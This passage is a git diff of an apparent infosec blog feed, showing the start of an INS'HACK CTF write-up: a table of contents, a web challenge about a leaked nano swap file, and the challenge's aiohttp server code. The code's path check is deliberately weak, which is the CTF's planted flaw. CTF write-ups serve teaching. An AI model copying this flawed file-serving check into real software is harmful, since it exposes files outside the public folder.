@@ -1,4 +1,1280 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-01-06T15:09:16+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">BoiteAKlou’s Infosec Blog</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">35C3 CTF Writeups</title><link href="http://localhost:4000/35C3-CTF-Writeups.html" rel="alternate" type="text/html" title="35C3 CTF Writeups" /><published>2018-12-31T17:00:00+01:00</published><updated>2018-12-31T17:00:00+01:00</updated><id>http://localhost:4000/35C3-CTF-Writeups</id><content type="html" xml:base="http://localhost:4000/35C3-CTF-Writeups.html">&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/ccc-logo.gif&quot; alt=&quot;CCL logo&quot; title=&quot;CCL logo&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-07-04T21:13:02+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">BoiteAKlou’s Infosec Blog</title><subtitle>Computer security oriented blog held by a french student in IT and Networks. This blog aims at teaching the fundamentals of Cyber Security to beginners through CTF write-ups and didactic articles.</subtitle><author><name>BoiteAKlou</name></author><entry><title type="html">INS’HACK CTF Writeups</title><link href="http://localhost:4000/INSHACK-CTF-Writeups.html" rel="alternate" type="text/html" title="INS'HACK CTF Writeups" /><published>2019-05-08T10:00:00+02:00</published><updated>2019-05-08T10:00:00+02:00</updated><id>http://localhost:4000/INSHACK-CTF-Writeups</id><content type="html" xml:base="http://localhost:4000/INSHACK-CTF-Writeups.html">&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/inshack-logo.png&quot; alt=&quot;INSHACK logo&quot; title=&quot;INSHACK logo&quot; width=&quot;40%&quot; /&gt;&lt;/p&gt;
+
+&lt;!--excerpt--&gt;
+
+&lt;h2 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h2&gt;
+
+&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#web-exploring-the-universe&quot; id=&quot;markdown-toc-web-exploring-the-universe&quot;&gt;[Web] Exploring the universe&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#statement&quot; id=&quot;markdown-toc-statement&quot;&gt;Statement&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#resolution&quot; id=&quot;markdown-toc-resolution&quot;&gt;Resolution&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#web-almost-tchap&quot; id=&quot;markdown-toc-web-almost-tchap&quot;&gt;[Web] Almost Tchap&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#statement-1&quot; id=&quot;markdown-toc-statement-1&quot;&gt;Statement&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#resolution-1&quot; id=&quot;markdown-toc-resolution-1&quot;&gt;Resolution&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#programming-hackcode-0102&quot; id=&quot;markdown-toc-programming-hackcode-0102&quot;&gt;[Programming] HackCode-01/02&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#statement-2&quot; id=&quot;markdown-toc-statement-2&quot;&gt;Statement&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#example&quot; id=&quot;markdown-toc-example&quot;&gt;Example&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#strategy&quot; id=&quot;markdown-toc-strategy&quot;&gt;Strategy&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#part-01&quot; id=&quot;markdown-toc-part-01&quot;&gt;Part 01&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#part-02&quot; id=&quot;markdown-toc-part-02&quot;&gt;Part 02&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#reverse-dashlame&quot; id=&quot;markdown-toc-reverse-dashlame&quot;&gt;[Reverse] Dashlame&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#statement-3&quot; id=&quot;markdown-toc-statement-3&quot;&gt;Statement&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#uncompyle&quot; id=&quot;markdown-toc-uncompyle&quot;&gt;Uncompyle&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#understanding-the-script&quot; id=&quot;markdown-toc-understanding-the-script&quot;&gt;Understanding the script&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#resolution-2&quot; id=&quot;markdown-toc-resolution-2&quot;&gt;Resolution&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#alternative-way-using-decrypt_archive&quot; id=&quot;markdown-toc-alternative-way-using-decrypt_archive&quot;&gt;Alternative way using decrypt_archive()&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#pwn-intergover&quot; id=&quot;markdown-toc-pwn-intergover&quot;&gt;[Pwn] Intergover&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#statement-4&quot; id=&quot;markdown-toc-statement-4&quot;&gt;Statement&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#spotting-the-vulnerabilty&quot; id=&quot;markdown-toc-spotting-the-vulnerabilty&quot;&gt;Spotting the vulnerabilty&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#pwn-signed-or-unsigned&quot; id=&quot;markdown-toc-pwn-signed-or-unsigned&quot;&gt;[Pwn] Signed or unsigned&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#statement-5&quot; id=&quot;markdown-toc-statement-5&quot;&gt;Statement&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#spotting-the-vulnerability&quot; id=&quot;markdown-toc-spotting-the-vulnerability&quot;&gt;Spotting the vulnerability&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;web-exploring-the-universe&quot;&gt;[Web] Exploring the universe&lt;/h2&gt;
+
+&lt;h3 id=&quot;statement&quot;&gt;Statement&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Will you be able to find the &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt; in the &lt;code class=&quot;highlighter-rouge&quot;&gt;universe/&lt;/code&gt; ?&lt;/p&gt;
+
+  &lt;p&gt;I’ve been told that the guy who wrote this nice application called server.py is a huge fan of nano (yeah… he knows vim is better).&lt;/p&gt;
+
+  &lt;p&gt;http://exploring-the-universe.ctf.insecurity-insa.fr/&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Here is a screen capture of the website in question:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/exploringtheuniverse.png&quot; alt=&quot;Exploring the universe&quot; title=&quot;Exploring the universe&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The page was quite empty apart from this funny JS game named “JSLander” where you had to land a rocket by controlling its speed and trajectory. Unfortunately, a successful landing gave no flag.&lt;/p&gt;
+
+&lt;h3 id=&quot;resolution&quot;&gt;Resolution&lt;/h3&gt;
+
+&lt;p&gt;A huge hint was given by the challenge statement about a file named &lt;code class=&quot;highlighter-rouge&quot;&gt;server.py&lt;/code&gt; which would be edited by &lt;code class=&quot;highlighter-rouge&quot;&gt;nano&lt;/code&gt;. After a few guesses, we managed to retrieve the file &lt;code class=&quot;highlighter-rouge&quot;&gt;.server.py.swp&lt;/code&gt; automatically created by &lt;code class=&quot;highlighter-rouge&quot;&gt;nano&lt;/code&gt; when the original file is being edited.&lt;/p&gt;
+
+&lt;p&gt;server.py:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pathlib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Path&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;mimetypes&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;guess_type&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;aiohttp&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;PUBLIC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ROOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;joinpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'public'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;stream_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'''Streams a regular file
+    '''&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PUBLIC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;joinpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'DT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'DT_DIR'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPNotFound&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'DT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'DT_UNKNOWN'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;relative_to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPForbidden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reason&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You can't go beyond the universe...&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;mime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;guess_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'DT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'DT_REG'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mime&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'application/octet-stream'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'Content-Length'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;st_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Content-Encoding'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encoding&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StreamResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prepare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'rb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resp&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;handle_403&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'''Stream 403 HTML file
+    '''&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'403.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;handle_404&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'''Stream 404 HTML file
+    '''&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'404.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;create_error_middleware&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;overrides&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'''Create an error middleware for aiohttp
+    '''&lt;/span&gt;
+    &lt;span class=&quot;nd&quot;&gt;@web.middleware&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;error_middleware&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'''Handles specific web exceptions based on overrides
+        '''&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;overrides&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPException&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;overrides&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error_middleware&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup_error_middlewares&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'''Setup error middleware on given application
+    '''&lt;/span&gt;
